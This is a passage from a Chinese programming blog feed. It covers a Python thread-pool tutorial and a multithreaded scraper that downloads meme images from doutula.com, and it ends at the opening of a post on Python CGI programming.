class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">'msg:'</span>,msg)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func_return: %s'</span> % msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#apply_async</span></span><br><span class="line">    print(<span class="string">'\n------apply_async--------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg = <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply_async(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply_async:不阻塞'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        i.wait()     <span class="comment">#等待进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> i.ready():            <span class="comment">#判断进程函数是否已经启动了</span></span><br><span class="line">            <span class="keyword">if</span> i.successful():   <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">                print(i.get())   <span class="comment">#输出进程函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#apply</span></span><br><span class="line">    print(<span class="string">'\n----------apply---------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg =  <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply:阻塞'</span>)           <span class="comment">#执行完func才可以执行该语句</span></span><br><span class="line">    <span class="comment"># pool.close()</span></span><br><span class="line">    <span class="comment"># pool.join()</span></span><br><span class="line">    print(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map</span></span><br><span class="line">    print(<span class="string">'\n---------map-----------'</span>)</span><br><span class="line">    args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">5</span>)</span><br><span class="line">    return_data = pool.map(func,args)</span><br><span class="line">    print(<span class="string">'map:阻塞'</span>) <span class="comment">#执行完func才执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(return_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map_async</span></span><br><span class="line">    print(<span class="string">'\n-------map_async---------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">5</span>)</span><br><span class="line">    result = pool.map_async(func,args)</span><br><span class="line">    print(<span class="string">'ready:'</span>,result.ready())</span><br><span class="line">    print(<span class="string">'不阻塞'</span>)</span><br><span class="line">    result.wait()  <span class="comment">#等待所有进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.ready():           <span class="comment">#判断进程函是否已经启动了</span></span><br><span class="line">        <span class="keyword">if</span> result.successful():  <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">            print(result.get())  <span class="comment">#输出进程函数的返回值</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530167991.95.png" alt=""></p><h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><blockquote><p>通过对比可以发现线程池和进程池的代码差别并不是很大，和前面通过队列实现并发一样，所以在选取以何种方式做并发时还是要结合实际的情况</p></blockquote><h3 id="实例应用"><a href="#实例应用" class="headerlink" title="实例应用"></a>实例应用</h3><blockquote><p>学习了这么多，还是要进行实际运用，接下来利用线程池做一个高并发的爬虫，同时也可以巩固一下爬虫。这个练习是通过线程池结合队列爬取表情包(emmm)，以斗图啦网站为例(<a href="https://www.doutula.com" target="_blank" rel="noopener">https://www.doutula.com</a>)</p></blockquote><ul><li><p>分析页面，在最新表情中表情包最多，一共有1655页，每一页的连接为：<a href="https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png)" target="_blank" rel="noopener">https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png)</a></p></li><li><p>当然，我们查看的时候看到的是浏览器渲染以后的页面，所以元素可能会是动态生成的；如果要查看未渲染之前的图片，直接查看源码，也是一样的。</p></li><li><p>分析一下图片的连接：该网站使用新浪的图床<code>ws1.sinaimg.cn</code>,多查看几个图片地址发现不一定是<code>ws1</code>子域名 ，可能是是任何<code>ws</code>开头，后面跟数字 ，出现这种情况的原因是：根据HTTP/1.1协议规定，浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞 ，所以利用不同的子域来绕过限制。这一点其实不影响我们（假如你的正则是直接匹配图片完整连接）</p></li><li><p>经过测试，网站没有做反爬，接下来就简单了，步骤如下：</p><ul><li>获取单个页面用正则匹配img标签的图片地址和图片描述</li><li>将获取到的表情包下载保存</li><li>改变page参数爬取所有的列表页面</li></ul></li><li><p>当然，重要的是用上线程池，为了提高爬取速度，再加上进程的通信</p></li><li><p>代码实现：</p><ul><li><p>设置图片保存的文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br></pre></td></tr></table></figure></li><li><p>创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br></pre></td></tr></table></figure></li><li><p>创建两个线程池，分别用于图片任务和页面任务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li><li><p>用正则去匹配图片信息，并将获取到的图片链接和描述入队</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">'data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;'</span>,re.S)</span><br><span class="line">    img_list = re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> url, name <span class="keyword">in</span> img_list:</span><br><span class="line">        <span class="comment">#将图片的后缀加到name中，方便后面的保存</span></span><br><span class="line">        name = name + url[<span class="number">-4</span>:]</span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br></pre></td></tr></table></figure></li><li><p>获取页面的源码（尽管没有限制，但还是加上UA头和cookie）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持,确保连接的是同一个页面，将同一个页面的爬取完以后再连接下一个页面</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        get_imglist(response.text)</span><br></pre></td></tr></table></figure></li><li><p>保存表情包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br></pre></td></tr></table></figure></li><li><p>主函数（启动线程池，队列等）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ef main():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line">    <span class="comment"># get_page()</span></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())</span><br></pre></td></tr></table></figure></li><li><p>完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置图片保存的文件夹,如果运行的py文件存在，os.path.dirname(__file__)输出完整的目录，如果是相对路径，输出为空</span></span><br><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br><span class="line"><span class="comment"># print(BASE_DIR)</span></span><br><span class="line"><span class="comment">#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</span></span><br><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建两个线程池，分别用于图片任务和页面任务</span></span><br><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">error = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#用正则去匹配图片信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">'data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;'</span>,re.S)</span><br><span class="line">    img_list = re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> url, name <span class="keyword">in</span> img_list:</span><br><span class="line">        name = name + url[<span class="number">-4</span>:]</span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        get_imglist(response.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line">    <span class="comment"># get_page()</span></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li><li><p>运行结果：</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530183677.11.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530183691.54.png" alt=""></p></li></ul></li><li><p>以上是通过正则表达式来做的，下面稍加修改，用解析库来做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br><span class="line"><span class="comment"># print(BASE_DIR)</span></span><br><span class="line"><span class="comment">#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</span></span><br><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建两个线程池，分别用于图片任务和页面任务</span></span><br><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">error = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">    img_list = soup.find_all(<span class="string">'a'</span>,class_=<span class="string">'col-xs-6 col-sm-3'</span>)</span><br><span class="line">    <span class="comment"># print(img_list)</span></span><br><span class="line">    <span class="keyword">for</span> imgs <span class="keyword">in</span> img_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = imgs.find(<span class="string">'img'</span>)[<span class="string">'data-original'</span>]</span><br><span class="line">            name = imgs.find(<span class="string">'p'</span>,style=<span class="string">'display: none'</span>).text + url[<span class="number">-4</span>:]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        get_imglist(response.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>本文是对python实现并发的学习总结，具体有python进程并发编程的几种方式以及它们之间的关联与区别，通过实例来体现与利用，最后的实例加上了爬虫的内容，这是再学习安全之余对于编程的学习，安全最后还是离不开代码，相辅相成。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python进程池和线程池学习&quot;&gt;&lt;a href=&quot;#python进程池和线程池学习&quot; class=&quot;headerlink&quot; title=&quot;python进程池和线程池学习&quot;&gt;&lt;/a&gt;python进程池和线程池学习&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;前几天学习
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.xyz/categories/python/"/>
    
    
      <category term="python" scheme="https://www.lsowl.xyz/tags/python/"/>
    
      <category term="线程池" scheme="https://www.lsowl.xyz/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
      <category term="进程池" scheme="https://www.lsowl.xyz/tags/%E8%BF%9B%E7%A8%8B%E6%B1%A0/"/>
    
      <category term="爬虫" scheme="https://www.lsowl.xyz/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>python CGI编程</title>
    <link href="https://www.lsowl.xyz/2018/06/17/python-CGI%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.lsowl.xyz/2018/06/17/python-CGI编程学习/</id>
    <published>2018-06-17T05:17:00.000Z</published>
    <updated>2018-06-17T05:29:17.540Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python-CGI编程"><a href="#python-CGI编程" class="headerlink" title="python CGI编程"></a>python CGI编程</h2><p>###什么是CGI</p><blockquote><p>CGI(Commom Gateway Interface)通用网关接口，它是一段程序，运行在服务器。如HTTP服务器，提供同客户端HTML页面的接口。</p></blockquote><h3 id="网页浏览"><a href="#网页浏览" class="headerlink" title="网页浏览"></a>网页浏览</h3><blockquote><p>通过在网页上点击一个链接或URL的流程了解CGI是如何工作的</p></blockquote><ol><li>使用浏览器访问URL连接到HTTP web 服务器</li><li>web 服务器接收到请求以后解析URL，并查找访问文件是否在HTTP服务器上存在，如果存在返回内容，不存在返回错误信息</li><li>CGI程序可以是python脚本，Perl脚本，shell脚本，C或C++程序等</li></ol><h3 id="CGI架构图及其本地环境配置"><a href="#CGI架构图及其本地环境配置" class="headerlink" title="CGI架构图及其本地环境配置"></a>CGI架构图及其本地环境配置</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529201542.26.png" alt=""></p><ul><li><p>采用PHPstudy+windows测试，修改httpd.conf配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 